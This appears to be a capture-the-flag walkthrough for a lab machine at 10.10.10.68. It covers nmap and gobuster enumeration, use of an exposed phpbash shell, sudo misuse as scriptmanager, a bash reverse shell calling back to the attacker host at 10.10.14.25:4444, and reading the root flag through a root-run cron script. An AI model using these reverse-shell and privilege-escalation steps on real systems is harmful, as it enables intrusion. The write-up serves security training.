# Solution

Start with the usual nmap enumeration
```
nmap -sC -sV -oN nmap-initial 10.10.10.68
```
 Only port 80 is open.  

We run gobuster
```
gobuster dir -u http://10.10.10.68 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 25
```
And we get a bunch of directories. We visit /dev and we have an interactive shell provided by phpbash.php as expected when browsing the website.  
If we go to /home/arrexel we can find the user flag.  

We know want to escalate our privileges to root.

We run sudo -l and we have the following:
```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

It means that we can run every command as scriptmanager.We try if it is actually possible. First we go in the home directory of scriptmanager, then we try to create a .ssh folder (it is not possible for user www-data)

---
Don't do like me, what I'm doing right now is stupid ... 
```
sudo -u scriptmanager bash -c "mkdir .ssh"
```
It actually works. We can thus proceed to copy our local rsa public key  to the authorized_keys of scriptmanager in order to have a more comfortable access. We set up a fast web server in our local machine
```
python3 -m http.server
```
In the remote machine we download the id_rsa.pub file and we rename it to authorized_keys.  
```
sudo -u scriptmanager bash -c "wget 10.10.14.25:8000/id_rsa.pub"
sudo -u scriptmanager bash -c "mv id_rsa.pub .ssh/authorized_keys"
```
We also adjust the access privileges to .ssh
```
sudo -u scriptmanager bash -c "chmod 600 .ssh"
```
 I'm idiot, the ssh port is not open ....
--- 

Let's back to our path to root.  
We can create a file with a reverse shell owned by scriptmanager in the remote machine. To avoid escape problems, we create in the local machine and transfer it in the remote machine. 10.10.14.25 is the address of my local machine where i set up a netcat istener on port 4444. The file we generate carries a reverse shell:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
```

We can execute it as scriptmanager:
```
sudo -u scriptmanager bash -c "chmod 777 shell.sh"
sudo -u scriptmanager bash -c "./shell.sh"
```

Then we run LinPeas. We see that the directory /script has been recently updated (linpeas also highlighted this as a suspicious behaviour). This means that a kind of scheduled script execution is in place.  
Inside of the /script directory we see a python file and a txt file (owned by root) which is the output of the python file. We can easily exploit this configuration to escalate our privileges.  

We can have the root flag by writing some easy python lines
```
f=open("test.sh","w")
fr=open("/root/root.txt","r")
f.write(fr.readline())
f.close()
fr.close()
```
We wait for the next automatic execution of the script (withing 1 minute) and we can retrieve the root flag by reading the txt file.  
